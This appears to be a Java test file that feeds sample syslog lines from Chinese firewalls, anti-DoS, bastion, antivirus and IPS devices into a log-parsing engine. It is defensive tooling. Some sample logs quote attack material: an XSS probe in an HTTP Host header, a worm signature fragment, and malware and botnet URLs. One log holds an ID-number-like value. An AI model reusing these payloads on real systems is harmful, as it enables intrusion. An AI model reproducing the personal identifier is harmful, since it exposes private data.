      data = "id=\"NGTOS\" version=\"V3.2294.26021_NGFW.1_R\" time=\"2020-03-24 17:01:22\" dev=\"105.172\" pri=\"4\" type=\"url_filter\" recorder=\"url_filter\" vsid=\"0\" vsys_name=\"root_vsys\" user=\"N/A\" src=\"19.19.19.20\" dst=\"192.168.105.90\" sport=\"1179\" dport=\"80\" fw_name=\"fw109263530\" profile=\"ceshi_url\" subtype=\"blacklist\" cat_name=\"none\" url=\"192.168.105.90/index.htm\"  action=\"block\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.26021_NGFW.1_R\" time=\"2020-03-24 16:00:38\" dev=\"TopsecOS\" pri=\"4\" type=\"数据过滤\" recorder=\"datafilter\" index=\"1130\" vsid=\"0\" vsys_name=\"root_vsys\" user=\"100.3.3.10\" src=\"100.3.3.10\" dst=\"100.6.6.10\" sport=\"80\" dport=\"60537\" profile=\"df1\" groupname=\"kg1\" protoname=\"http\" fw_name=\"fw324155539\" field=\"下载\" action=\"阻断\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.26021_NGFW.1_R\" time=\"2020-03-24 17:01:22\" dev=\"105.172\" pri=\"4\" type=\"file_block\" recorder=\"file_block\" vsid=\"0\" vsys_name=\"root_vsys\" user=\"78.1.1.111\" protoname=\"FTP_Data_Download\" src=\"78.1.1.111\" dst=\"10.1.1.20\" sport=\"14571\" dport=\"431\" fw_name=\"fw107163530\" direction=\"download\" filetype=\"png\" action=\"block\" profile=\"file\" rule=\"jpeg\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.26021_NGFW.1_R\" time=\"2020-03-24 17:58:19\" dev=\"root_vsys\" pri=\"6\" type=\"黑名单\" recorder=\"pf_rule\" index=\"1145\" vsid=\"0\" vsys_name=\"root_vsys\" src=\"null\" dst=\"null\" sport=\"null\" dport=\"null\" smac=\"a0:8c:fd:da:a5:31\" dmac=\"00:16:31:f5:29:64\" protoid=\"0\" user=\"未知\" appname=\"未知\" modname=\"MANUAL\" msg=\"被MAC黑名单阻止\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.26021_NGFW.1_R\" time=\"2020-03-24 17:27:57\" dev=\"TopsecOS254\" pri=\"4\" type=\"apt\" recorder=\"apt\" index=\"1080\" vsid=\"0\" vsys_name=\"root_vsys\" protoname=\"http\" user=\"192.168.105.251\" src=\"192.168.105.251\" dst=\"3.3.3.30\" sport=\"80\" dport=\"49230\" method=\"DOWNLOAD\" url=\"192.168.105.251/~img18\" sender=\"null\" receiver=\"null\" cc=\"null\" bcc=\"null\" subject=\"null\" filename=\"~img18\" virus_name=\"v6\" fw_name=\"fw324151649\" action=\"block\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.2010_NGFW.1_R\" time=\"2019-07-05 17:41:10\" dev=\"root_vsys\" pri=\"6\" type=\"ip mac绑定\" recorder=\"ipmac\" index=\"1140\" vsid=\"0\" vsys_name=\"root_vsys\" src=\"192.168.105.232\" smac=\"a0:8c:fd:da:a5:31\" msg=\"IP地=192.168.105.232 MAC地址=a0:8c:fd:da:a5:32 IP和MAC匹配错误\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.26016_NGFW_D.1_R\" time=\"2020-03-24 19:24:31\" dev=\"TopsecOS\" pri=\"3\" type=\"行为分析\" recorder=\"abnormal_threat\" index=\"1225\" vsid=\"0\" vsys_name=\"root_vsys\" policyid=\"15882\" abnormal_warning_type=\"流量\" msg=\"标准为 0,现在是5,不在波动范围内(40)\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"V3.2294.26021_NGFW.1_R\" time=\"2020-03-23 10:23:06\" dev=\"TopsecOS\" pri=\"4\" type=\"ctrlsess\" recorder=\"control-session\" vsid=\"0\" vsys_name=\"root_vsys\" action=\"block\" policyid=\"12792\" condition_type=\"src ip\" user=\"10.47.86.1\" cs_obj=\"192.168.105.37\" msg=\"connection number already reached threshold\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.26031_NGFW_HWXQ_10.1_R_B\" time=\"2020-06-20 19:18:54\" dev=\"TopsecOS\" pri=\"6\" type=\"入侵防御日志\" recorder=\"IPSEVENT\" index=\"2120\" vsid=\"0\" vsys_name=\"root_vsys\" protoname=\"tcp\" src=\"1.1.142.108\" sport=\"5189\" dst=\"1.2.69.111\" dport=\"80\" smac=\"02:1a:c5:01:00:00\" dmac=\"02:1a:c5:02:00:00\" rid=\"18900\" msg=\"ntopng 跨站脚本漏洞 \" action=\"告警\" cve=\"2014-5464\" attack_type=\"HTTP攻击类（HTTP）\" os_name=\"所有\" pop_name=\"中\" risk_name=\"中\" sift_name=\"一般规则\" application=\"HTTP\" fw_name=\"fw620124716\" rcdpkt_filename=\"000d4852f6e3.005-0_435137-19181-ips-18900.pcap\" content1=\"HOST: <SCRIPT>ALERT(\" content2=\"\" atk_result=\"未知\" request_head=\"Host: <script>alert('BreakingPoint')</script>\" request_body=\"\" response_head=\"\" response_body=\"\" response_state=\"\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.26031_NGFW_HWXQ_10.1_R_B\" time=\"2020-06-20 19:19:00\" dev=\"TopsecOS\" pri=\"6\" type=\"僵木蠕防御\" recorder=\"TVD\" index=\"2141\" vsid=\"0\" vsys_name=\"root_vsys\" protoname=\"tcp\" src=\"2.0.0.40\" sport=\"63440\" dst=\"2.1.0.224\" dport=\"25\" smac=\"2c:53:4a:01:72:5c\" dmac=\"2c:53:4a:01:72:5d\" rid=\"60000\" msg=\"Live Malware Mobile Symbian OS Cabir.A Wor \" action=\"告警\" cve=\"NULL\" attack_type=\"蠕虫类（Virus-Worm）\" os_name=\"所有\" pop_name=\"中\" risk_name=\"中\" sift_name=\"一般规则\" application=\"SMTP\" fw_name=\"fw620124716\" rcdpkt_filename=\"000d4852f6e3.005-0_60-80356-btwps-60000.pcap\" content1=\"PRqLAxI6ABAZBAAQxOCAq0DoAQADAAEAAAAAACEAAADIAAAACQAAAAEAAAAA\" content2=\"\" atk_result=\"未知\" request_head=\"\" request_body=\"\" response_head=\"\" response_body=\"\" response_state=\"\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"V3.2294.26021_NGFW.1_R\" time=\"2020-07-03 14:35:28\" dev=\"TopsecOS\" pri=\"5\" type=\"僵木蠕防御日志\" recorder=\"TVD\" index=\"2141\" vsid=\"0\" vsys_name=\"root_vsys\" protoname=\"tcp\" src=\"192.168.66.126\" sport=\"23\" dst=\"10.10.10.34\" dport=\"9200\" smac=\"2c:53:4a:01:72:5c\" dmac=\"2c:53:4a:01:72:5d\" rid=\"60027\" msg=\"test\" action=\"阻断\" cve=\"NULL\" attack_type=\"蠕虫类（Virus-Worm）\" os_name=\"所有\" pop_name=\"中\" risk_name=\"中\" sift_name=\"一般规则\" application=\"SMTP\" fw_name=\"fw309135539\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.26018F_NGFW_D17514.1_R\" time=\"2020-03-24 16:35:46\" dev=\"TopsecOS\" pri=\"6\" type=\"僵尸网络\" recorder=\"TVD\" index=\"2142\" vsid=\"0\" vsys_name=\"root_vsys\" protoname=\"DNS\" src=\"10.10.10.5\" sport=\"57091\" dst=\"10.10.12.5\" dport=\"53\" smac=\"00:50:56:92:a3:c8\" dmac=\"00:90:0b:41:86:7b\" sarea=\"12\" darea=\"111\" bad_domain=\"teredo.ipv6.microsoft.com\" action=\"告警\" attack_type=\"恶意软件\" fw_name=\"fw323191444\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"V3.2294.23041_NGFW.1_R\" time=\"2020-04-13 09:57:40\" dev=\"TopsecOS\" pri=\"4\" type=\"neighbour\" recorder=\"neighbour\" index=\"2480\" vsid=\"0\" interface=\"feth0\" ip=\"333::11\" mac=\"00:16:31:ec:17:c4\" msg=\"Duplicate address detected!\"";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testFWSanfor() {
    String parserFile = "./resources/parsers/firewall_sangfor_ngaf[7.1]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<23>May 25 11:11:56 localhost fwlog: 日志类型:WAF应用防护日志, 源IP:192.168.200.1, 源端口:1084, 目的IP:192.168.200.100, 目的端口:80, 攻击类型:信息泄漏攻击, 严重级别:高, 系统动作:拒绝, URL:192.200.41.126";
      parse(botuEngine, data);
      data = "<23>May 25 11:31:48 localhost fwlog: 日志类型:IPS防护日志, 源IP:192.168.200.1, 源端口:1102, 目的IP:192.168.200.100, 目的端口:80, 协议:tcp, 攻击类型:web漏洞攻击, 漏洞名称:WebCalendar本地文件包含和PHP代码注入漏洞, 严重等级:高, 动作:拒绝";
      parse(botuEngine, data);
      data = "<23>May 25 11:05:16 localhost fwlog: 日志类型:DOS攻击日志, 源IP:192.168.200.53, 目的IP:192.168.200.152, 攻击方向:外网, 攻击类型:SYN和FIN标志位同时为1, 严重等级:中, 系统动作:拒绝";
      parse(botuEngine, data);
      data = "<23>May 25 11:16:42 localhost fwlog: 日志类型:病毒查杀, 用户:(null), 源IP:192.168.200.1, 源端口:49566, 目的IP:192.168.200.100, 目的端口:80, 病毒类型:2156133424, 病毒名:Heuristics.PDF.ObfuscatedNameObject, 应用名称:HTTP, 严重等级:高, 系统动作:被记录, URL:http://192.200.41.126/repro/adobe_pdf_embedded_exe_nojs.pdf";
      parse(botuEngine, data);
      data = "<23>May 25 11:12:42 localhost fwlog: 日志类型:网站访问, 用户:(null), 源IP:192.168.200.1, 目的IP:192.168.200.100, 应用名称:IT相关, 系统动作:被记录, URL:http://www.shenxinfu.com/simple.php";
      parse(botuEngine, data);
      data = "<23>May 25 11:05:16 localhost fwlog: 日志类型:服务控制或应用控制, 用户:(null), 源IP:192.168.200.43, 源端口:7093, 目的IP:192.168.200.142, 目的端口:80, 应用类型:HTTP应用, 应用名称:网站浏览, 系统动作:被记录";
      parse(botuEngine, data);
      data = "<23>Jan 14 14:53:39 localhost fwlog: 日志类型:系统操作, 用户:admin, IP地址:200.200.88.121, 操作对象:启用禁用, 操作类型:启用, 描述:OSPF 启用 成功";
      parse(botuEngine, data);
      data = "<23>May 25 11:22:03 localhost fwlog: 日志类型:用户认证, 用户:192.168.200.199, IP地址:192.168.200.199, 操作对象:注销, 登录时间:2016-05-25 10:55:54, 登录时长:1569, 注销时间:11:22:03";
      parse(botuEngine, data);
      data = "<23>Jan 14 14:51:25 localhost nat: 日志类型:NAT日志, NAT类型:snat, 源IP:192.15.168.120, 源端口:52977, 目的IP:113.108.80.138, 目的端口:53, 协议:17, 转换后的IP:192.168.155.246, 转换后的端口:52977";
      parse(botuEngine, data);
      data = "<23>May 25 11:12:45 localhost fwlog: 日志类型:僵尸网络日志, 源IP:192.168.200.30, 源端口:1114, 目的IP:192.168.200.129, 目的端口:2000, 攻击类型:僵尸网络, 严重级别:低, 系统动作:被记录, URL:10.1.1.8:2000/DLLServer.dat";
      parse(botuEngine, data);
      data = "<23>May 25 12:45:59 localhost fwlog: 日志类型:SSL VPN用户行为日志, 用户:wjj, IP地址:100.100.88.121, 操作对象:SSL VPN, 操作:登录, 时间:2016-05-25 12:45:59, 描述:登录成功";
      parse(botuEngine, data);
      data = "<23>May 25 12:45:59 localhost fwlog: 日志类型:SSL VPN用户行为日志, 用户:wjj, IP地址:100.100.88.121, 操作对象:SSL VPN, 操作:登录, 时间:2016-05-25 12:45:59, 描述:登录成功";
      parse(botuEngine, data);
      data = "<134>Aug  3 15:35:55 sfos-x86_64 fwlog[1408064]: 所属系统:public, 日志类型:服务控制或应用控制, 策略名称:应用控制策略, 用户:(null), 源IP:192.168.10.123, 源端口:9026, 目的IP:203.209.246.138, 目的端口:9000, 应用类型:any, 应用名称:, 系统动作:允许";
      parse(botuEngine, data);
      data = "<23>Jan 14 14:51:25 localhost nat: 日志类型:NAT日志, NAT类型:snat, 源IP:192.15.168.120, 源端口:52977, 目的IP:113.108.80.138, 目的端口:53, 协议:17, 转换后的IP:192.168.155.246, 转换后的端口:52977";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testAntiDosTopsec() {
    String parserFile = "./resources/parsers/antidos_topsec_topads[3.2262.2219]_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "id=\"ngtos\" version=\"v3.2262.2219.1_ads\" time=\"2019-04-02 06:58:13\" dev=\"TopADS111\" pri=\"information\" type=\"ads_attack_flow\" recorder=\"ads_attack_flow_log\" index=\"2176\" vsid=\"0\" symbol=\"attack flow log\" event_id=\"388\" time_begin=\"2019-04-02 14:57:12\" dst_addr=\"124.88.135.52\" obj_type=\"tuple-1\" obj_extend1=\"124.88.135.52\" obj_extend2=\"any other\" obj_extend3=\"any other\" zone=\"bps124\" grpname=\"default\" cur_t=\"2019-04-02 14:58:13\" alarm_level=\"medium\" app_name=\"ip\" domain=\"\" attack_type=\"https flood\" is_private_atk=\"0\" threshold=\"5\" unit=\"pps\" status=\"inactive\" proto=\"tcp\" port=\"443\" recv_bps=\"3235\" recv_pps=\"3\" tx_bps=\"0\" tx_pps=\"0\" is_under_atk=\"1\" time_interval=\"60\" protocol=\"tcp\" src_ip=\"113.200.117.72, 113.200.107.118, 113.200.204.182, 113.200.204.42, 113.200.107.190, 113.200.205.22, 113.200.107.150, 113.200.106.214, 113.200.204.105, 123.139.49.234\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2262.2209.1_ads\" time=\"2019-03-27 05:18:59\" dev=\"联通出口ADS\" pri=\"information\" type=\"ads flow log\" recorder=\"ads_flow_log\" index=\"2161\" vsid=\"0\" symbol=\"flow log\" dst_addr=\"111.200.39.114/Web App\" obj_type=\"tuple-3\" obj_extend1=\"111.200.39.114\" obj_extend2=\"any other\" obj_extend3=\"any other\" zone=\"default\" grpname=\"sys_group_1\" cur_t=\"2019-03-27 13:19:21\" template=\"default.sys_group_1\" app_name=\"Web App\" domain=\"\" is_under_atk=\"1\" protocol=\"ip\" flow_type=\"NULL\" recv_pps=\"2\" recv_bps=\"1536\" drop_pps=\"0\" drop_bps=\"0\" max_pps=\"0\" max_bps=\"0\" min_pps=\"0\" min_bps=\"0\" time_interval=\"60\" direction=\"in\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"v3.2262.2219.1_ads\" time=\"2019-05-08 07:35:23\" dev=\"TopADS111\" pri=\"information\" type=\"ads_lead\" recorder=\"ads_lead_log\" index=\"2162\" vsid=\"0\" symbol=\"lead log\" cur_t=\"2019-04-02 15:35:22\" end_t=\"NULL\" dst_addr=\"20.1.1.200\" dst_mask=\"32\" sendto=\"\" zonename=\"test1\" grpname=\"\" lead_action=\"lead-on\" lead_way=\"manual\" lead_src_addr=\"127.0.0.1\" admin=\"superman\" lead_msgs=\"superman allowed to lead flow in zone test1 manual,route information:20.1.1.200/32\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2262.2209.1_ads\" time=\"2019-03-11 09:18:34\" dev=\"联通出口ADS\" pri=\"information\" type=\"ads credit log\" recorder=\"ads_credit_log\" index=\"2164\" vsid=\"0\" symbol=\"credit log\" src_ip=\"115.124.29.244\" zonename=\"default\" grpname=\"sys_group_11\" attack_type=\"base auth\" country=\"China\" city=\"Zhejiang\" latitude=\"30.293600\" longitude=\"120.161400\" is_proxy=\"0\" cur_t=\"2019-03-11 17:21:12\" time_interval=\"300\" white_times=\"0\" black_times=\"0\" credit_confirm_times=\"0\" total_pkts=\"256\" total_bytes=\"23040\" drop_pkts=\"0\" drop_bytes=\"0\" new_conns=\"10\" concur_conns=\"0\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"v3.2262.2219.1_ads\" time=\"2019-04-02 08:39:22\" dev=\"TopADS111\" pri=\"information\" type=\"ads_atk_geo\" recorder=\"ads_atk_geo_log\" index=\"2163\" vsid=\"0\" symbol=\"attack geo log\" event_id=\"4478\" dst_addr=\"any other\" obj_type=\"tuple-1\" zone=\"default\" grpname=\"default\" time_begin=\"2019-04-02 16:28:17\" attack_type=\"session check\" cur_t=\"2019-04-02 16:39:21\" country=\"China\" city=\"Fujian\" latitude=\"26.047100\" longitude=\"119.330200\" drop_pkts=\"37\" drop_bytes=\"4037\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"v3.2262.2219.1_ads\" time=\"2019-05-08 06:55:19\" dev=\"TopADS111\" pri=\"information\" type=\"ads_learn_single_attr\" recorder=\"ads_learn_single_attr_log\" index=\"2165\" vsid=\"0\" symbol=\"learn single attr log\" parent=\"bps139\" module_type=\"3\" time_begin=\"2019-04-02 14:50:18\" end_t=\"2019-04-02 14:55:18\" learn_cycle=\"5\" learn_times=\"8640\" status=\"learning\" learn_type=\"icmp-flow-ctrl\" max_value=\"0.000000\" min_value=\"0.000000\" average_value=\"0.000000\" sample_num=\"0\" total_value=\"0.000000\" auto_gen_policy_value=\"0.000000\" gen_value_merge_method=\"max\" is_auto_gen_policy=\"1\" unit=\"mbps\" cmd_type=\"icmp-flow-ctrl\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"v3.2262.2219.1_ads\" time=\"2019-05-08 07:33:29\" dev=\"TopADS111\" pri=\"information\" type=\"ads_learn_topn\" recorder=\"ads_learn_topn_log\" index=\"2166\" vsid=\"0\" symbol=\"learn topn log\" parent=\"bps36\" module_type=\"2\" time_begin=\"2019-04-02 14:48:28\" end_t=\"2019-04-02 15:33:27\" learn_cycle=\"5\" learn_times=\"8640\" status=\"learning\" learn_type=\"user-defined-app\" ranking=\"1\" object=\"other\" ratio=\"100\" total_value=\"2.000000\" auto_gen_policy_value=\"1.000000\" gen_value_merge_method=\"max\" is_auto_gen_policy=\"0\" unit=\"pps\" cmd_type=\"user-defined-app\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"v3.2262.2219.1_ads\" time=\"2019-05-08 07:18:18\" dev=\"TopADS111\" pri=\"information\" type=\"ads_domain_topn_log\" recorder=\"ads_domain_topn_log\" index=\"2170\" vsid=\"0\" symbol=\"dns domain topn log\" parent=\"default\" module_type=\"3\" time_begin=\"\" cur_t=\"2019-04-02 15:18:18\" end_t=\"\" status=\"learning\" topntype=\"dns-query-domain\" zonename=\"default\" grpname=\"default\" domain=\"bizhi.360.cn\" query_type=\"all\" match_count=\"4\" bandwidth=\"384\" aver_pps=\"1\" sugg_pps=\"2\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"v3.2262.2219.1_ads\" time=\"2019-05-08 07:37:10\" dev=\"TopADS111\" pri=\"information\" type=\"ads_alarm_log\" recorder=\"ads_alarm_log\" index=\"2167\" vsid=\"0\" symbol=\"alarm log\" alarm_level=\"medium\" alarm_msg=\"the device is trying to lead the traffic of 20.1.1.1/32, but no packet has arrived in the past 2 minutes,please check the network or related configuration!\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2262.2209.1_ads\" time=\"2019-03-27 05:19:03\" dev=\"联通出口ADS\" pri=\"information\" type=\"ads src topn model log\" recorder=\"ads_src_topn_model_log\" index=\"2171\" vsid=\"0\" symbol=\"attack src topn model log\" dst_addr=\"sys_group_1\" obj_type=\"group\" zonename=\"default\" grpname=\"sys_group_1\" time_begin=\"2019-03-27 12:29:02\" attack_type=\"source flow model change\" atk_type=\"ip_src_flow_topn_cfg\" cur_t=\"2019-03-27 13:19:02\" src_addr=\"112.65.157.238\" src_flow_p=\"0\" src_flow_b=\"0\" ratio=\"42\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2262.2209.1_ads\" time=\"2019-03-27 05:19:03\" dev=\"联通出口ADS\" pri=\"information\" type=\"ads ipgeo model log\" recorder=\"ads_ipgeo_model_log\" index=\"2172\" vsid=\"0\" symbol=\"attack ipgeo model log\" dst_addr=\"sys_group_1\" obj_type=\"group\" zonename=\"default\" grpname=\"sys_group_1\" time_begin=\"2019-03-27 12:29:02\" atk_type=\"ip geographical distribution\" cur_t=\"2019-03-27 13:19:02\" module_type=\"geographical distribution\" obj_extend1=\"China\" obj_extend2=\"Beijing\" is_abnormal=\"1\" cfg_ratio=\"40.819156\" learn_ratio=\"58.917903\" learn_byte=\"2246912\" drop_bytes=\"0\"";
      parse(botuEngine, data);
      data = "id=\"ngtos\" version=\"v3.2262.2219.1_ads\" time=\"2019-04-02 07:36:11\" dev=\"TopADS111\" pri=\"information\" type=\"ads_protect_status\" recorder=\"ads_protect_status_log\" index=\"2175\" vsid=\"0\" symbol=\"protecte status\" zonename=\"test1\" grpname=\"default\" cur_t=\"2019-04-02 15:37:10\" time_interval=\"60\" is_under_atk=\"1\" attack_num=\"0\" drop_bytes=\"544684\"";
      parse(botuEngine, data);
      data = "id=\"NGTOS\" version=\"v3.2262.2209.1_ads\" time=\"2019-03-27 05:19:09\" dev=\"联通出口ADS\" pri=\"information\" type=\"ads attack flow log\" recorder=\"ads_attack_flow_log\" index=\"2176\" vsid=\"0\" symbol=\"attack flow log\" event_id=\"671938\" time_begin=\"2019-03-27 13:19:07\" dst_addr=\"sys_group_41\" obj_type=\"group\" obj_extend1=\"sys_group_41\" obj_extend2=\"any other\" obj_extend3=\"any other\" zone=\"default\" grpname=\"sys_group_41\" cur_t=\"2019-03-27 13:19:07\" alarm_level=\"low\" app_name=\"ip\" domain=\"\" attack_type=\"source flow model change\" is_private_atk=\"1\" threshold=\"50\" unit=\"ratio\" status=\"active\" proto=\"udp\" port=\"4000\" recv_bps=\"0\" recv_pps=\"0\" tx_bps=\"0\" tx_pps=\"0\"  time_interval=\"0\" protocol=\"other\" src_ip=\"\"";
      parse(botuEngine, data);

    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testBastionLegendSec() {
    String parserFile = "./resources/parsers/bastion_legendsec_secfox_warn.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<174>2020-10-29T16:50:04.099207+08:00 SecFox baoleiji logType=YAB_CMD_OPS_LOG, time=2020-10-29 16:50:04, user=linbin, sourceIP=10.10.100.243, resource=¨¨????????????¡è¡ì???webA, targetIP=10.10.103.1, command=mkdir videos, action=permit";
      parse(botuEngine, data);
      data = "<174>2020-10-29T16:45:48.348679+08:00 SecFox baoleiji logType=YAB_FILE_OPS_LOG, time=2020-10-29 16:45:48, user=linbin, sourceIP=10.10.100.243, resource=¨¨????????????¡è¡ì???webA, targetIP=10.10.103.1, operation=Delete, filename=u01, sourcePath=, targetPath=??????: /var/www/html, size=0, result=Failed";
      parse(botuEngine, data);
      data = "<174>2020-10-29T16:22:53.152851+08:00 SecFox baoleiji logType=YAB_SYSTEM_LOGIN_LOG, time=2020-10-29 16:22:53, user=linbin, sourceIP=10.10.100.243, operation=Logged in, logonType=Web, result=Success";
      parse(botuEngine, data);
      data = "<174>2020-10-29T16:00:29.721713+08:00 SecFox baoleiji 10-29 16:00:29.721 - logType=YAB_HISTORY_SESSION_LOG, startTime=2020-10-29 15:22:37, endTime=2020-10-29 16:00:29, user=zhangzx, sourceIP=10.11.5.145, resource=Dns???????????¡§, targetIP=10.10.100.1, protocol=RDP, account=administrator, historySession=http://10.11.5.1:80/shareRecord.html?id=7yfl8zyrhoHQgks952h8tly7aHvydEHKgOxkKQ==";
      parse(botuEngine, data);
      data = "<174>2020-10-29T16:00:29.720955+08:00 SecFox baoleiji logType=YAB_RESOURCE_LOGIN_LOG, startTime=2020-10-29 15:22:37, endTime=2020-10-29 16:00:29, user=zhangzx, sourceIP=10.11.5.145, resource=Dns???????????¡§, targetIP=10.10.100.1, protocol=RDP, account=administrator";
      parse(botuEngine, data);
      data = "<174>2020-10-28T15:19:40.235491+08:00 SecFox baoleiji INSERT INTO `cs_tmp` VALUES ('????¡¤?¨¨??', '350322199310045649', '15373503277923', '2013-03-01', '?¡¤???????', '??¡§???¨¨?????????????¡ì¨¨??¨¨???????¡ì', '1129394260773650433');";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testAntiVirusLeadSec() {
    String parserFile = "./resources/parsers/antiVirus_leadsec_power-v6000_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<157>rule: devid=4 date=\"2019/09/04 01:49:31\" dname=themis logtype=9 pri=5 ver=0.3.0 from=---- mod=绛栫暐 act=淇\uE1BD敼 id=1 policy=55 name=pf1 newid=1 sat=none sport= smac= satport= pa= ia= iif=any oif=any izone= ozone= service=any proxy= ps= is= time=any long=0 dcfpolicy=0 avpolicy=0 cppolicy=0 ipspolicy=0 dlppolicy=0 pcpolicy=0 eimpolicy=0 auditpolicy=0 username= log=寮�鍚� active=寮�鍚�  user=\"root\" dsp_msg=\"淇\uE1BD敼浜嗚\uE749鍒�\" result=鎴愬姛 fwlog=0";
      parse(botuEngine, data);
      data = "<158>webui: devid=4 date=\"2019/09/04 01:38:45\" dname=themis logtype=9 pri=6 ver=0.3.0 mod=webui from=10.155.254.155 user=administrator agent=\"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36\" act=鏄剧ず page=\"鏃ュ織鏌ョ湅\" dsp_msg=\"鏄剧ず鏃ュ織鏌ョ湅椤甸潰\" fwlog=0";
      parse(botuEngine, data);
      data = "<158>webui: devid=4 date=\"2019/09/04 01:34:09\" dname=themis logtype=9 pri=6 ver=0.3.0 mod=webui from=10.155.254.155 agent=\"Mozilla/5.0 \" admin=administrator act=鐧诲綍 result=0 msg=\"鎴愬姛\" dsp_msg=\"administrator 鐧诲綍\"  fwlog=0";
      parse(botuEngine, data);
      data = "<5>kernel: devid=4 date=\"2019/09/04 00:21:39\" dname=themis logtype=1 pri=5 ver=0.3.0 rule_name=pf1 mod=pf sa=10.155.243.58 sport=NULL type=8 da=10.155.243.57 dport=NULL code=0 proto=IPPROTO_ICMP policy=POLICY_PERMIT duration=0 rcvd=139 sent=139 fwlog=0 dsp_msg=\"鍖呰繃婊ゆ棩蹇�\"";
      parse(botuEngine, data);
      data = "<5>kernel: devid=4 date=\"2019/09/04 14:16:37\" dname=themis logtype=1 pri=5 ver=0.3.0 rule_name=pf1 mod=pf sa=10.155.243.58 sport=NULL type=8 da=10.155.243.57 dport=NULL code=0 proto=IPPROTO_ICMP policy=POLICY_PERMIT duration=0 rcvd=139 sent=139 fwlog=0 dsp_msg=\"鍖呰繃婊ゆ棩蹇�\"";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testIpsLeadSec() {
    String parserFile = "./resources/parsers/ips_leadsec_6000ips_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<214>Sep  3 16:29:10 ips IPS: SerialNum=2313401809279998 GenTime=\"2019-09-03 16:29:10\" SrcIP=10.155.243.54 SrcIP6= SrcIPVer=4 DstIP=10.155.243.53 DstIP6= DstIPVer=4 Protocol=ICMP SrcPort=0 DstPort=0 InInterface=xge1/3 OutInterface=xge1/1 SMAC=00:00:5e:00:01:64 DMAC=dc:da:80:d0:80:25 FwPolicyID=1 EventName=ICMP_PING_事件 EventID=152320139 EventLevel=0 EventsetName=All SecurityType=协议分析 SecurityID=10 ProtocolType=ICMP ProtocolID=7 Action=PASS Vsysid=0 Content=\"类型=8;\" CapToken= EvtCount=1";
      parse(botuEngine, data);
      data = "<358>Sep  3 16:27:46 ips RUN_INFO: SerialNum=2313401809279998 GenTime=\"2019-09-03 16:27:46\" CpuUsage=0.87   MemoryUsage=10.04 SessionNum=1 HalfSessionNum=0  Eth1Band=2000000 Eth2Band=0 Eth3Band=0 Eth4Band=0 Sysbps=8 Content=\"operation success\" EvtCount=1";
      parse(botuEngine, data);
    } catch (IOException e) {
      e.printStackTrace();
    }
  }

  public void testAcmH3C() {
    String parserFile = "./resources/parsers/acm_h3c_acg1000_syslog.bo";
    Properties properties = buildProperties();
    try {
      BotuEngineFactory engineFactory = new BotuEngineFactory(properties);
      BotuEngine botuEngine = engineFactory.createBotuEngine(parserFile);
      EventPrintListener listener = new EventPrintListener();
      botuEngine.addBotuListener(listener);
      String data = "<6>May 29 09:58:21 H3C;110104700118072615188454;ipv4;3; web_access: user_name=hanwanyun;user_group_name=USER1;term_platform=;term_device=PC;src_ip=10.12.22.49;dst_ip=101.226.161.228;url_domain=s.360.cn;url=https://s.360.cn;url_cate_name=计算机与互联网;handle_action=0;msg=";
      parse(botuEngine, data);
